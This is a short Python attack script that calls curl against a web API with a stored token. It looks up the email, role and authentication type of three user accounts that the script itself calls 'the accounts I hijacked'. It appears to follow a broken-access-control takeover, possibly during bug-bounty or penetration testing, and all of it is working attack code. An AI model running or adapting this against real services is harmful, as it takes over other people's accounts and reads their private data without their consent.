import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== current emails for the accounts I hijacked ===")
for uid in [171,172,315]:
    c,b=req('GET',f'/api/v1/users/{uid}')
    try:
        u=json.loads(b)['users'][0]
        print(f"  {uid}: {u['email']} role={u['role_id']} auth={u['auth_type']}")
    except: print(f"  {uid}: {b[:100]}")
